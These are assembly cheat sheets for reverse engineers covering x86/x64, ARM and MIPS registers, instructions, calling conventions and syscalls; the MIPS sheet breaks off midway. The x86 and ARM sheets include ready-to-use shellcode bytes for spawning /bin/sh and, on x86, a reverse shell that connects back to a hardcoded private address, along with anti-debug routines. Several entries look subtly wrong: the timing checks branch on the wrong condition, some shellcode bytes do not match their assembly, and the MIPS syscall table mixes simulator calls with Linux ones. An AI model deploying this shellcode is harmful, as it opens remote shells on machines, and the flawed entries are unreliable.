
# x86/x64 Assembly Quick Reference
## For Reverse Engineers

---

## 📊 REGISTERS

### General Purpose (x64)
| Register | Purpose                          | 32-bit | 16-bit | 8-bit |
|----------|----------------------------------|--------|--------|-------|
| RAX      | Accumulator, Return Value        | EAX    | AX     | AL/AH |
| RBX      | Base Register                    | EBX    | BX     | BL/BH |
| RCX      | Counter, 4th Argument            | ECX    | CX     | CL/CH |
| RDX      | Data, 3rd Argument               | EDX    | DX     | DL/DH |
| RSI      | Source Index, 2nd Argument       | ESI    | SI     | SIL   |
| RDI      | Destination Index, 1st Argument  | EDI    | DI     | DIL   |
| RBP      | Base Pointer                     | EBP    | BP     | BPL   |
| RSP      | Stack Pointer                    | ESP    | SP     | SPL   |
| R8-R15   | Additional Registers             | R8D-R15D | R8W-R15W | R8B-R15B |

### Special Registers
```
RIP - Instruction Pointer
RFLAGS - Flags Register
CS, DS, ES, FS, GS, SS - Segment Registers
```

### Flags Register (RFLAGS)
```
CF - Carry Flag          (Bit 0)
PF - Parity Flag         (Bit 2)
AF - Auxiliary Carry     (Bit 4)
ZF - Zero Flag           (Bit 6)
SF - Sign Flag           (Bit 7)
TF - Trap Flag           (Bit 8)
IF - Interrupt Enable    (Bit 9)
DF - Direction Flag      (Bit 10)
OF - Overflow Flag       (Bit 11)
```

---

## 🔧 COMMON INSTRUCTIONS

### Data Movement
| Instruction | Example | Description |
|-------------|---------|-------------|
| MOV | `mov rax, rbx` | Copy value |
| LEA | `lea rax, [rbx+8]` | Load effective address |
| PUSH | `push rax` | Push onto stack |
| POP | `pop rbx` | Pop from stack |
| XCHG | `xchg rax, rbx` | Exchange values |

### Arithmetic
| Instruction | Example | Flags Affected |
|-------------|---------|----------------|
| ADD | `add rax, rbx` | CF, OF, SF, ZF, AF, PF |
| SUB | `sub rax, 10` | CF, OF, SF, ZF, AF, PF |
| INC | `inc rax` | OF, SF, ZF, AF, PF |
| DEC | `dec rbx` | OF, SF, ZF, AF, PF |
| MUL | `mul rbx` | CF, OF |
| IMUL | `imul rax, rbx` | CF, OF |
| DIV | `div rbx` | (none) |
| IDIV | `idiv rbx` | (none) |

### Logical/Bitwise
| Instruction | Example | Description |
|-------------|---------|-------------|
| AND | `and rax, rbx` | Bitwise AND |
| OR | `or rax, rbx` | Bitwise OR |
| XOR | `xor rax, rax` | Clear register |
| NOT | `not rax` | Bitwise NOT |
| TEST | `test rax, rax` | AND without storing |
| SHL | `shl rax, 2` | Shift left |
| SHR | `shr rax, 2` | Shift right (unsigned) |
| SAR | `sar rax, 2` | Shift right (signed) |

### Control Flow
| Instruction | Condition | Description |
|-------------|-----------|-------------|
| JMP | Always | Unconditional jump |
| JE/JZ | ZF=1 | Jump if equal/zero |
| JNE/JNZ | ZF=0 | Jump if not equal |
| JL/JNGE | SF≠OF | Jump if less |
| JG/JNLE | ZF=0 & SF=OF | Jump if greater |
| CALL | Always | Call function |
| RET | Always | Return |
| LOOP | CX≠0 | Loop while CX > 0 |

### String Operations
| Instruction | Description | Used With |
|-------------|-------------|-----------|
| MOVSB/MOVSW/MOVSD | Move string | REP |
| CMPSB/CMPSW/CMPSD | Compare strings | REPZ/REPNZ |
| SCASB/SCASW/SCASD | Scan string | REPZ/REPNZ |
| STOSB/STOSW/STOSD | Store string | REP |
| LODSB/LODSW/LODSD | Load string | (none) |

---

## 🏗️ MEMORY ADDRESSING MODES

### Basic Forms
```
[base]                    ; Direct addressing
[base + displacement]     ; Base + offset
[base + index]           ; Base + index register
[base + index*scale + disp] ; Full form
```

### Examples
```assembly
mov rax, [rbx]           ; Load from address in RBX
mov rax, [rbx + 8]       ; RBX + 8
mov rax, [rbx + rcx]     ; RBX + RCX
mov rax, [rbx + rcx*4 + 16] ; RBX + (RCX*4) + 16
```

### Scale Factors
- `*1` (default)
- `*2`
- `*4`
- `*8`

---

## 📞 CALLING CONVENTIONS

### System V AMD64 ABI (Linux/macOS)
```
Arguments: RDI, RSI, RDX, RCX, R8, R9
Return: RAX (and RDX for 128-bit)
Floating Point: XMM0-XMM7
Caller-saved: RAX, RCX, RDX, RSI, RDI, R8-R11
Callee-saved: RBX, RBP, R12-R15
Stack alignment: 16-byte before CALL
```

### Microsoft x64 (Windows)
```
Arguments: RCX, RDX, R8, R9, then stack
Return: RAX
Floating Point: XMM0-XMM3
Caller-saved: RAX, RCX, RDX, R8-R11
Callee-saved: RBX, RBP, RDI, RSI, R12-R15, RSP
Shadow space: 32 bytes (4 args) on stack
```

### Common Patterns
```assembly
; Function prologue
push rbp
mov rbp, rsp
sub rsp, 0x20    ; Allocate stack space

; Function epilogue
mov rsp, rbp
pop rbp
ret
```

---

## 🐚 SYSTEM CALLS

### Linux x64 (syscall)
```
RAX = syscall number
RDI = 1st argument
RSI = 2nd argument
RDX = 3rd argument
R10 = 4th argument
R8  = 5th argument
R9  = 6th argument
```

### Common Linux Syscalls
| # | Name | Description | Parameters |
|---|------|-------------|------------|
| 0 | read | Read from file | fd, buf, count |
| 1 | write | Write to file | fd, buf, count |
| 2 | open | Open file | filename, flags, mode |
| 3 | close | Close file | fd |
| 59 | execve | Execute program | filename, argv, envp |
| 60 | exit | Terminate process | status |
| 62 | fork | Create process | - |

### Windows x64
```
RCX = 1st argument
RDX = 2nd argument
R8  = 3rd argument
R9  = 4th argument
Stack = remaining arguments
```

---

## 🔍 COMMON PATTERNS IN REVERSE ENGINEERING

### Function Identification
```assembly
; Prologue
55                    push rbp
48 89 e5              mov rbp, rsp
48 83 ec ??           sub rsp, ???

; Epilogue
48 89 ec              mov rsp, rbp
5d                    pop rbp
c3                    ret
```

### Loop Patterns
```assembly
; for(i=0; i<n; i++)
xor ecx, ecx          ; i = 0
loop_start:
cmp ecx, [rbp-4]      ; i < n
jge loop_end
; loop body
inc ecx
jmp loop_start
loop_end:

; while(*ptr != 0)
mov rax, [rbp-8]      ; ptr
loop_start:
movzx edx, byte [rax]
test edx, edx
jz loop_end
; loop body
inc rax
jmp loop_start
loop_end:
```

### String Operations
```assembly
; strlen()
mov rdi, string
xor rax, rax
mov rcx, -1
repne scasb
not rcx
dec rcx              ; RCX = length

; strcpy()
mov rdi, dest
mov rsi, src
mov rcx, length
rep movsb
```

---

## ⚠️ ANTI-DEBUG TECHNIQUES

### Detection Methods
```assembly
; ptrace check
xor rax, rax
mov al, 101          ; ptrace syscall
xor rdi, rdi         ; PTRACE_TRACEME
syscall
cmp rax, -1
je debugger_detected

; Timing check
rdtsc
shl rdx, 32
or rax, rdx
mov rbx, rax
; ... delay ...
rdtsc
shl rdx, 32
or rax, rdx
sub rax, rbx
cmp rax, 10000       ; Threshold
jl debugger_detected
```

---

## 🐚 SHELLCODE PATTERNS

### Linux x64 execve("/bin/sh")
```assembly
; Null-free version
xor rdx, rdx
push rdx
mov rbx, '/bin//sh'
push rbx
mov rdi, rsp
push rdx
push rdi
mov rsi, rsp
xor rax, rax
mov al, 59
syscall
```

### Windows x64 MessageBox
```assembly
; Find kernel32.dll, GetProcAddress, etc.
; MessageBoxA parameters:
; RCX = hWnd (NULL)
; RDX = Text pointer
; R8  = Caption pointer
; R9  = Type (MB_OK = 0)
```

---

## 🔧 DEBUGGING COMMANDS

### GDB Commands
```
break *0x401234      ; Set breakpoint
run                  ; Start execution
stepi / nexti        ; Step instruction/function
info registers       ; Show registers
x/20x $rsp           ; Examine memory
disas                ; Disassemble current
backtrace            ; Show call stack
```

### Common Breakpoints
```
strcmp, memcmp       ; String comparisons
malloc, free         ; Memory allocation
recv, send           ; Network operations
CreateFile, ReadFile ; File operations
```

---

## 📝 OPCODE QUICK REFERENCE

### Common Opcodes
```
0x90                nop
0xC3                ret
0xCC                int3 (breakpoint)
0x55                push rbp
0x48 89 e5          mov rbp, rsp
0x48 83 ec ??       sub rsp, ??
0x48 8b ??          mov reg, [mem]
0x48 89 ??          mov [mem], reg
0x48 31 ??          xor reg, reg
0x48 ff c?          inc reg
0x48 ff c8          dec rax
```

### Jump Opcodes
```
0xEB ??             jmp rel8
0xE9 ?? ?? ?? ??    jmp rel32
0x74 ??             je/jz rel8
0x75 ??             jne/jnz rel8
0x0F 84 ?? ?? ?? ?? je rel32
0x0F 85 ?? ?? ?? ?? jne rel32
```

---

## 🎯 REVERSE ENGINEERING TIPS

### 1. String Analysis
```bash
strings binary | grep -i "password\|key\|secret"
rabin2 -z binary     # Radare2 strings
```

### 2. Function Discovery
```bash
objdump -t binary | grep "\.text"
nm binary            # Symbols
readelf -s binary    # ELF symbols
```

### 3. Control Flow
```bash
# Generate CFG
r2 -c 'ag > cfg.dot' binary
```

### 4. Pattern Matching
- Look for `0x55 0x48 0x89 0xe5` (function start)
- Look for `0xc3` or `0xc2 ?? ??` (return)
- Look for `0xcc` sequences (breakpoints)

---

## 📚 QUICK MEMORY LAYOUT

```
High Address
┌─────────────────┐
│ Kernel Space    │
├─────────────────┤
│ Stack           │ ← RSP (grows down)
│ (local vars)    │
├─────────────────┤
│ ↓               │
│                 │
│ ↑               │
├─────────────────┤
│ Heap            │ (malloc/free)
├─────────────────┤
│ .bss            │ (uninitialized data)
├─────────────────┤
│ .data           │ (initialized data)
├─────────────────┤
│ .rodata         │ (read-only data)
├─────────────────┤
│ .text           │ (code) ← RIP
└─────────────────┘
Low Address
```

---

## 🚀 COMMON SHELLCODE BYTES

```
# Linux x64 execve("/bin/sh")
\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68
\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6
\xb0\x3b\x0f\x05

# Reverse shell (Linux x64)
\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48
\x97\x48\xb9\x02\x00\x11\x5c\xc0\xa8\x01\x01\x51\x48
\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05\x6a\x03\x5e
\x48\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x6a\x3b\x58
\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53\x48
\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05
```

---

## 📞 QUICK SYSTEM CALL TABLE (Linux)

| RAX | Name | RDI | RSI | RDX |
|-----|------|-----|-----|-----|
| 0 | read | fd | buf | count |
| 1 | write | fd | buf | count |
| 2 | open | filename | flags | mode |
| 3 | close | fd | - | - |
| 9 | mmap | addr | length | prot |
| 11 | munmap | addr | length | - |
| 12 | brk | addr | - | - |
| 39 | getpid | - | - | - |
| 57 | fork | - | - | - |
| 59 | execve | filename | argv | envp |
| 60 | exit | error_code | - | - |
| 61 | wait4 | pid | status | options |
| 62 | kill | pid | sig | - |

---

**Pro Tip:** Bookmark this cheat sheet! Print it out if you're doing serious reverse engineering work.

*Last Updated: 2024*
```

### **docs/cheat-sheets/arm_quickref.md**
```markdown
# ARM/ARM64 Assembly Quick Reference
## For Reverse Engineers

---

## 📊 REGISTERS

### ARM32 (AArch32)
| Register | Purpose | Alternate Name |
|----------|---------|----------------|
| R0-R12 | General Purpose | - |
| R13 | Stack Pointer | SP |
| R14 | Link Register | LR |
| R15 | Program Counter | PC |
| CPSR | Current Program Status Register | - |

### ARM64 (AArch64)
| Register | 64-bit | 32-bit | Purpose |
|----------|--------|--------|---------|
| X0-X30 | Full | W0-W30 | General Purpose |
| X29 | FP | W29 | Frame Pointer |
| X30 | LR | W30 | Link Register |
| SP | SP | WSP | Stack Pointer |
| PC | PC | - | Program Counter |
| NZCV | - | - | Flags Register |

### Special Registers
```
FP (X29) - Frame Pointer
LR (X30) - Link Register (return address)
SP - Stack Pointer
PC - Program Counter (cannot be directly accessed)
```

### Condition Flags (NZCV)
```
N - Negative (result < 0)
Z - Zero (result == 0)
C - Carry (unsigned overflow)
V - Overflow (signed overflow)
```

---

## 🔧 COMMON INSTRUCTIONS

### Data Movement
| Instruction | ARM32 | ARM64 | Description |
|-------------|-------|-------|-------------|
| MOV | `mov r0, r1` | `mov x0, x1` | Move |
| MVN | `mvn r0, r1` | `mvn x0, x1` | Move NOT |
| LDR | `ldr r0, [r1]` | `ldr x0, [x1]` | Load from memory |
| STR | `str r0, [r1]` | `str x0, [x1]` | Store to memory |
| LDP | - | `ldp x0, x1, [sp]` | Load pair |
| STP | - | `stp x0, x1, [sp]` | Store pair |

### Arithmetic
| Instruction | Example | Description |
|-------------|---------|-------------|
| ADD | `add r0, r1, r2` | Addition |
| SUB | `sub r0, r1, #10` | Subtraction |
| MUL | `mul r0, r1, r2` | Multiplication |
| SDIV | `sdiv r0, r1, r2` | Signed division |
| UDIV | `udiv r0, r1, r2` | Unsigned division |

### Logical/Bitwise
| Instruction | Example | Description |
|-------------|---------|-------------|
| AND | `and r0, r1, r2` | Bitwise AND |
| ORR | `orr r0, r1, r2` | Bitwise OR |
| EOR | `eor r0, r1, r2` | Bitwise XOR |
| BIC | `bic r0, r1, r2` | Bit Clear |
| LSL | `lsl r0, r1, #2` | Logical Shift Left |
| LSR | `lsr r0, r1, #2` | Logical Shift Right |
| ASR | `asr r0, r1, #2` | Arithmetic Shift Right |

### Comparison
| Instruction | Example | Description |
|-------------|---------|-------------|
| CMP | `cmp r0, r1` | Compare (sets flags) |
| CMN | `cmn r0, r1` | Compare Negative |
| TST | `tst r0, r1` | Test bits |

### Control Flow
| Instruction | Example | Description |
|-------------|---------|-------------|
| B | `b label` | Branch (unconditional) |
| BL | `bl function` | Branch with Link (call) |
| BX | `bx lr` | Branch and eXchange |
| BLX | `blx r0` | Branch with Link and eXchange |
| RET | `ret` | Return (ARM64) |

---

## 🎯 CONDITION CODES

### ARM32 (Suffix)
| Suffix | Meaning | Condition |
|--------|---------|-----------|
| EQ | Equal | Z == 1 |
| NE | Not Equal | Z == 0 |
| CS/HS | Carry Set/Unsigned Higher or Same | C == 1 |
| CC/LO | Carry Clear/Unsigned Lower | C == 0 |
| MI | Minus/Negative | N == 1 |
| PL | Plus/Positive or Zero | N == 0 |
| VS | Overflow | V == 1 |
| VC | No Overflow | V == 0 |
| HI | Unsigned Higher | C == 1 && Z == 0 |
| LS | Unsigned Lower or Same | C == 0 \|\| Z == 1 |
| GE | Signed Greater or Equal | N == V |
| LT | Signed Less Than | N != V |
| GT | Signed Greater Than | Z == 0 && N == V |
| LE | Signed Less or Equal | Z == 1 \|\| N != V |
| AL | Always (default) | - |

### ARM64 (Separate instructions)
```assembly
b.eq label    ; Branch if equal
b.ne label    ; Branch if not equal
b.gt label    ; Branch if greater than
b.lt label    ; Branch if less than
```

---

## 🏗️ MEMORY ADDRESSING MODES

### ARM32
```
[Rn]                   ; Register indirect
[Rn, #offset]         ; Pre-indexed
[Rn, #offset]!        ; Pre-indexed with writeback
[Rn], #offset         ; Post-indexed
[Rn, Rm]              ; Register offset
[Rn, Rm, LSL #shift]  ; Scaled register
```

### ARM64
```
[Rn]                   ; Base only
[Rn, #imm]            ; Base + offset
[Rn, #imm]!           ; Pre-indexed
[Rn], #imm            ; Post-indexed
[Rn, Rm]              ; Base + register
[Rn, Rm, LSL #shift]  ; Base + scaled register
[Rn, Rm, SXTX]        ; Base + extended register
```

### Examples
```assembly
; ARM32
ldr r0, [r1]          ; Load from address in R1
ldr r0, [r1, #4]      ; R1 + 4
ldr r0, [r1, r2]      ; R1 + R2
ldr r0, [r1, r2, LSL #2] ; R1 + (R2 << 2)

; ARM64
ldr x0, [x1]          ; Load from X1
ldr x0, [x1, #8]      ; X1 + 8
ldr x0, [x1, x2]      ; X1 + X2
ldr x0, [x1, x2, LSL #3] ; X1 + (X2 << 3)
```

---

## 📞 CALLING CONVENTIONS

### ARM32 (AAPCS)
```
R0-R3   - First four arguments
R0      - Return value
R4-R11  - Callee-saved
R12     - Intra-procedure scratch (IP)
R13     - Stack Pointer (SP)
R14     - Link Register (LR)
R15     - Program Counter (PC)
```

### ARM64 (AAPCS64)
```
X0-X7   - First eight arguments
X0      - Return value
X8      - Indirect result location
X9-X15  - Caller-saved
X16-X17 - Intra-procedure scratch (IP0, IP1)
X18     - Platform register
X19-X28 - Callee-saved
X29     - Frame Pointer (FP)
X30     - Link Register (LR)
SP      - Stack Pointer
```

### Stack Frames
```assembly
; ARM64 Prologue
stp x29, x30, [sp, #-16]!  ; Save FP and LR
mov x29, sp                ; Set new FP
sub sp, sp, #N             ; Allocate stack

; ARM64 Epilogue
mov sp, x29                ; Restore SP
ldp x29, x30, [sp], #16    ; Restore FP and LR
ret                        ; Return
```

---

## 🐚 SYSTEM CALLS

### ARM32 (swi/svc)
```assembly
mov r7, #syscall_number
mov r0, #arg1
mov r1, #arg2
swi #0                    ; or svc #0
```

### ARM64 (svc)
```assembly
mov x8, #syscall_number
mov x0, #arg1
mov x1, #arg2
svc #0
```

### Common Linux Syscalls
| ARM32 | ARM64 | Name | Description |
|-------|-------|------|-------------|
| 4 | 64 | write | Write to file |
| 1 | 93 | exit | Terminate process |
| 11 | 56 | execve | Execute program |
| 5 | 63 | fstat | Get file status |
| 20 | 3 | getpid | Get process ID |

---

## 🔍 COMMON PATTERNS

### Function Prologue (ARM64)
```assembly
// Typical function start
stp x29, x30, [sp, #-16]!  // Save frame pointer and LR
mov x29, sp                 // Set new frame pointer
sub sp, sp, #0x20           // Allocate stack space
stp x19, x20, [sp, #16]    // Save callee-saved registers
```

### Loop Patterns
```assembly
// for(i=0; i<n; i++)
mov w0, #0                  // i = 0
mov w1, n                   // loop bound
loop:
cmp w0, w1
b.ge loop_end
// loop body
add w0, w0, #1              // i++
b loop
loop_end:

// while(*ptr != 0)
mov x0, ptr
loop:
ldrb w1, [x0]
cbz w1, loop_end            // Compare and branch if zero
// loop body
add x0, x0, #1
b loop
loop_end:
```

### String Operations
```assembly
// strlen (ARM64)
mov x0, string
mov x1, x0
loop:
ldrb w2, [x1], #1
cbnz w2, loop               // Continue if not zero
sub x0, x1, x0
sub x0, x0, #1              // Length
```

---

## ⚠️ ANTI-DEBUG TECHNIQUES

### ptrace Check (ARM64)
```assembly
mov x8, #117                // ptrace syscall
mov x0, #0                  // PTRACE_TRACEME
mov x1, #0
mov x2, #0
mov x3, #0
svc #0
cmp x0, #-1
b.eq debugger_detected
```

### Timing Check
```assembly
mrs x0, cntvct_el0          // Read virtual counter
mov x1, x0
// ... delay ...
mrs x0, cntvct_el0
sub x0, x0, x1
cmp x0, #10000              // Threshold
b.lt debugger_detected
```

---

## 🐚 SHELLCODE PATTERNS

### ARM64 execve("/bin/sh")
```assembly
// Null-free shellcode
mov x0, #0x6e69622f         // "/bin"
movk x0, #0x732f, lsl #16   // "//sh"
movk x0, #0x68, lsl #32
str x0, [sp, #-8]!
mov x0, sp
mov x1, xzr
mov x2, xzr
mov x8, #221                // execve syscall
svc #0
```

### ARM32 execve("/bin/sh")
```assembly
adr r0, bin_sh
eor r1, r1, r1
eor r2, r2, r2
mov r7, #11                 // execve syscall
svc #0
bin_sh: .asciz "/bin/sh"
```

---

## 🔧 DEBUGGING COMMANDS

### GDB for ARM
```
break *0x1000               // Set breakpoint
run                         // Start execution
stepi / nexti               // Step instruction
info registers              // Show registers
x/10x $sp                   // Examine stack
disas                       // Disassemble
layout asm                  // TUI mode
```

### Common Breakpoints
```
strcmp, memcmp              // String comparisons
malloc, free                // Memory allocation
open, read, write           // File operations
socket, connect, send       // Network operations
```

---

## 🎯 MODES AND INSTRUCTION SETS

### ARM vs Thumb
```
ARM Mode: 32-bit instructions, 4-byte aligned
Thumb Mode: 16/32-bit instructions, 2-byte aligned
```

### Mode Switching
```assembly
.code 32                    // ARM mode
.thumb                      // Thumb mode

// Switch to Thumb
adr r0, thumb_code + 1
bx r0
thumb_code:
.thumb_func
```

### Detection
- Check LSB of branch target:
  - 0 = ARM mode
  - 1 = Thumb mode

---

## 📝 OPCODE QUICK REFERENCE

### ARM64 Common Opcodes
```
0xd503201f  nop
0xd65f03c0  ret
0xa9bf7bfd  stp x29, x30, [sp, #-16]!
0x910003fd  mov x29, sp
0xd10023ff  sub sp, sp, #8
0xf94003e0  ldr x0, [sp]
0xb90003e0  str w0, [sp]
0x2a1f03e0  mov w0, wzr
0x11000400  add w0, w0, #1
0x7100041f  cmp w0, #1
```

### ARM32 Common Opcodes
```
0xe1a00000  nop
0xe12fff1e  bx lr
0xe92d4800  push {fp, lr}
0xe28db000  add fp, sp, #0
0xe24dd00c  sub sp, sp, #12
0xe59f0000  ldr r0, [pc]
0xe5801000  str r1, [r0]
0xe3a00000  mov r0, #0
0xe2800001  add r0, r0, #1
0xe3500000  cmp r0, #0
```

---

## 🚀 SHELLCODE BYTES

### ARM64 execve("/bin/sh")
```
\x20\x00\x80\xd2\x41\x00\x80\xd2\xa2\x03\x80\xd2
\x08\x07\x80\xd2\x01\x00\x00\xd4\x2f\x62\x69\x6e
\x2f\x73\x68\x00
```

### ARM32 execve("/bin/sh") (Thumb)
```
\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x78\x46\x0c\x30
\xc0\x46\x01\x90\x49\x1a\x92\x1a\x0b\x27\x01\xdf
\x2f\x62\x69\x6e\x2f\x73\x68\x00
```

---

## 🎯 REVERSE ENGINEERING TIPS

### 1. Identify Architecture
```bash
file binary
readelf -h binary
```

### 2. Check for Thumb Code
```bash
# Look for odd addresses in branch instructions
objdump -d binary | grep "bl\|bx" | grep "\\[1\\]$"
```

### 3. String Analysis
```bash
strings -e l binary    # Little-endian strings
rabin2 -z binary       # Radare2
```

### 4. Function Discovery
```bash
nm binary
readelf -s binary
objdump -t binary
```

### 5. Common Patterns to Look For
- `stp x29, x30, [sp, #-16]!` (function start)
- `ldp x29, x30, [sp], #16` (function end)
- `svc #0` or `swi #0` (system calls)
- `cbz`/`cbnz` (conditional branches)

---

## 📞 SYSTEM CALL TABLE (ARM64 Linux)

| X8 | Name | X0 | X1 | X2 |
|----|------|----|----|----|
| 63 | read | fd | buf | count |
| 64 | write | fd | buf | count |
| 56 | open | filename | flags | mode |
| 57 | close | fd | - | - |
| 222 | mmap | addr | length | prot |
| 215 | munmap | addr | length | - |
| 214 | brk | addr | - | - |
| 178 | getpid | - | - | - |
| 221 | execve | filename | argv | envp |
| 93 | exit | status | - | - |
| 260 | wait4 | pid | status | options |
| 129 | kill | pid | sig | - |

---

**Note:** ARM uses little-endian byte order by default.

*Last Updated: 2024*
```

### **docs/cheat-sheets/mips_quickref.md**
```markdown
# MIPS Assembly Quick Reference
## For Reverse Engineers

---

## 📊 REGISTERS

### General Purpose Registers (32-bit)
| Register | Name | Purpose |
|----------|------|---------|
| $0 | $zero | Always zero |
| $1 | $at | Assembler temporary |
| $2-$3 | $v0-$v1 | Function return values |
| $4-$7 | $a0-$a3 | Function arguments |
| $8-$15 | $t0-$t7 | Temporary (caller-saved) |
| $16-$23 | $s0-$s7 | Saved (callee-saved) |
| $24-$25 | $t8-$t9 | More temporaries |
| $26-$27 | $k0-$k1 | Kernel reserved |
| $28 | $gp | Global pointer |
| $29 | $sp | Stack pointer |
| $30 | $fp/$s8 | Frame pointer |
| $31 | $ra | Return address |

### Special Registers
```
PC - Program Counter
HI - High word (multiply/divide)
LO - Low word (multiply/divide)
```

### Coprocessor 0 (CP0) - System Control
```
Status - Processor status
Cause - Exception cause
EPC - Exception Program Counter
```

---

## 🔧 COMMON INSTRUCTIONS

### Data Movement
| Instruction | Example | Description |
|-------------|---------|-------------|
| LI | `li $t0, 100` | Load immediate |
| LA | `la $t0, label` | Load address |
| LW | `lw $t0, 0($sp)` | Load word |
| SW | `sw $t0, 0($sp)` | Store word |
| LB | `lb $t0, 0($a0)` | Load byte |
| SB | `sb $t0, 0($a0)` | Store byte |
| LUI | `lui $t0, 0x1000` | Load upper immediate |
| MFHI | `mfhi $t0` | Move from HI |
| MFLO | `mflo $t0` | Move from LO |
| MOVE | `move $t0, $t1` | Copy register |

### Arithmetic
| Instruction | Example | Description |
|-------------|---------|-------------|
| ADD | `add $t0, $t1, $t2` | Signed addition |
| ADDI | `addi $t0, $t1, 100` | Add immediate |
| ADDU | `addu $t0, $t1, $t2` | Unsigned addition |
| ADDIU | `addiu $t0, $t1, 100` | Add immediate unsigned |
| SUB | `sub $t0, $t1, $t2` | Subtraction |
| SUBU | `subu $t0, $t1, $t2` | Unsigned subtraction |
| MULT | `mult $t0, $t1` | Multiply (32x32→64) |
| MULTU | `multu $t0, $t1` | Unsigned multiply |
| DIV | `div $t0, $t1` | Divide |
| DIVU | `divu $t0, $t1` | Unsigned divide |

### Logical/Bitwise
| Instruction | Example | Description |
|-------------|---------|-------------|
| AND | `and $t0, $t1, $t2` | Bitwise AND |
| ANDI | `andi $t0, $t1, 0xFF` | AND immediate |
| OR | `or $t0, $t1, $t2` | Bitwise OR |
| ORI | `ori $t0, $t1, 0xFF` | OR immediate |
| XOR | `xor $t0, $t1, $t2` | Bitwise XOR |
| XORI | `xori $t0, $t1, 0xFF` | XOR immediate |
| NOR | `nor $t0, $t1, $t2` | Bitwise NOR |
| SLL | `sll $t0, $t1, 2` | Shift left logical |
| SRL | `srl $t0, $t1, 2` | Shift right logical |
| SRA | `sra $t0, $t1, 2` | Shift right arithmetic |

### Comparison
| Instruction | Example | Description |
|-------------|---------|-------------|
| SLT | `slt $t0, $t1, $t2` | Set if less than (signed) |
| SLTI | `slti $t0, $t1, 100` | Set if less than immediate |
| SLTU | `sltu $t0, $t1, $t2` | Set if less than (unsigned) |
| SLTIU | `sltiu $t0, $t1, 100` | Set if less than immediate unsigned |

### Control Flow
| Instruction | Example | Description |
|-------------|---------|-------------|
| J | `j label` | Jump |
| JAL | `jal function` | Jump and link (call) |
| JR | `jr $ra` | Jump to register (return) |
| JALR | `jalr $t0` | Jump and link register |
| BEQ | `beq $t0, $t1, label` | Branch if equal |
| BNE | `bne $t0, $t1, label` | Branch if not equal |
| BLEZ | `blez $t0, label` | Branch if less or equal to zero |
| BGTZ | `bgtz $t0, label` | Branch if greater than zero |
| BLTZ | `bltz $t0, label` | Branch if less than zero |
| BGEZ | `bgez $t0, label` | Branch if greater or equal to zero |

---

## 🏗️ MEMORY ADDRESSING MODES

### Basic Forms
```
offset($base)           ; Base + offset
label                   ; Direct addressing
($register)            ; Register indirect
```

### Examples
```assembly
lw $t0, 0($sp)         ; Load from stack
sw $t1, 4($fp)         ; Store to frame+4
la $t0, array          ; Load address of array
lw $t0, array          ; Load from array (pseudo-instruction)
```

### Immediate Values
- 16-bit signed for arithmetic/logical
- 16-bit unsigned for bitwise
- 32-bit through LUI + ORI

---

## 📞 CALLING CONVENTIONS (O32)

### Argument Passing
```
$a0-$a3 - First 4 arguments
$f12-$f15 - First 2 floating point arguments
Stack - Additional arguments
```

### Return Values
```
$v0-$v1 - Integer return values
$f0-$f3 - Floating point return values
```

### Register Usage
```
Caller-saved: $t0-$t9, $a0-$a3, $v0-$v1, $ra
Callee-saved: $s0-$s7, $gp, $sp, $fp
```

### Stack Frame Layout
```
High Address
┌─────────────────┐
│ Saved $ra       │ ← $fp + N
├─────────────────┤
│ Saved $fp       │ ← $fp
├─────────────────┤
│ Local Variables │
├─────────────────┤
│ Argument Area   │ ← $sp
└─────────────────┘
Low Address
```

### Function Prologue/Epilogue
```assembly
# Prologue
addiu $sp, $sp, -framesize
sw $ra, framesize-4($sp)
sw $fp, framesize-8($sp)
move $fp, $sp

# Epilogue
move $sp, $fp
lw $fp, framesize-8($sp)
lw $ra, framesize-4($sp)
addiu $sp, $sp, framesize
jr $ra
```

---

## 🐚 SYSTEM CALLS

### Linux MIPS (syscall)
```assembly
li $v0, syscall_number  # Syscall number
# Set arguments in $a0-$a3
syscall                 # Invoke syscall
# Result in $v0, error in $a3
```

### Common Syscalls (MIPS Linux)
| $v0 | Name | Arguments | Returns |
|-----|------|-----------|---------|
| 1 | print_int | $a0 = integer | - |
| 4 | print_string | $a0 = string address | - |
| 5 | read_int | - | $v0 = integer |
| 8 | read_string | $a0 = buffer, $a1 = length | - |
| 10 | exit | - | - |
| 11 | print_char | $a0 = character | - |
| 12 | read_char | - | $v0 = character |

### Actual Linux Syscalls
| Number | Name | Description |
|--------|------|-------------|
| 4001 | exit | Terminate process |
| 4003 | read | Read from file |
| 4004 | write | Write to file |
| 4005 | open | Open file |
| 4006 | close | Close file |
| 4011 | execve | Execute program |
| 4020 | getpid | Get process ID |

---

## 🔍 COMMON PATTERNS

### Function Prologue
```assembly
addiu $sp, $sp, -32    # Allocate stack frame
sw $ra, 28($sp)        # Save return address
sw $fp, 24($sp)        # Save frame pointer
move $fp, $sp          # Set new frame pointer
sw $s0, 20($sp)        # Save callee-saved registers
```

### Loop Patterns
```assembly
# for(i=0; i<n; i++)
li $t0, 0              # i = 0
lw $t1, n              # loop bound
loop:
slt $t2, $t0, $t1      # i < n?
beqz $t2, loop_end
# loop body
addiu $t0, $t0, 1      # i++
j loop
loop_end:

# while(*ptr != 0)
move $t0, ptr
loop:
lb $t1, 0($t0)
beqz $t1, loop_end     # *ptr == 0?
# loop body
addiu $t0, $t0, 1      # ptr++
j loop
loop_end:
```

### String Operations
```assembly
# strlen
move $t0, $a0          # str
li $t1, 0              # length = 0
loop:
lb $t2, 0($t0)
beqz $t2, done         # if *str == 0, break
addiu $t0, $t0, 1      # str++
addiu $t1, $t1, 1      # length++
j loop
done:
move $v0, $t1          # return length
```

---

## ⚠️ ANTI-DEBUG TECHNIQUES

### ptrace Check
```assembly
li $v0, 4026           # ptrace syscall
li $a0, 0              # PTRACE_TRACEME
li $a1, 0
li $a2, 0
li $a3, 0
syscall
li $t0, -1
beq $v0, $t0, debugger_detected
```

---

## 🎯 MIPS INSTRUCTION FORMATS

### R-Type (Register)
```
31-26  25-21  20-16  15-11  10-6   5-0
opcode   rs     rt     rd   shamt  funct
```

### I-Type (Immediate)
```
31-26  25-21  20-16  15-0
opcode   rs     rt   immediate
```

